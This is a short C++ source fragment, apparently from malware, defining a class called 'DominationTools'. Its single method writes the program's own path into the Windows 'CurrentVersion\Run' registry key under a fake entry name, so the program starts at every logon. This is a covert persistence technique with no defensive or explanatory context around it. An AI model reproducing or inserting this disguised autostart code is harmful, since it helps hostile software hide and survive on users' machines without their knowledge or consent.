class DominationTools{
	private:
		HKEY hKey;
		LONG lnRes;
		const char* czStartName = Current.fakename;
		const char* czExePath	= Current.name;

	public:
		void EnableAutoStart(){
		        lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
		                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		                                    0 , KEY_WRITE,
		                                    &hKey);
		        if( ERROR_SUCCESS == lnRes )
		        {
		            lnRes = RegSetValueEx(  hKey,
		                                    czStartName,
		                                    0,
		                                    REG_SZ,
		                                    (unsigned char*)czExePath,
		                                    strlen(czExePath) );
		        }

		        RegCloseKey(hKey);

		}
};
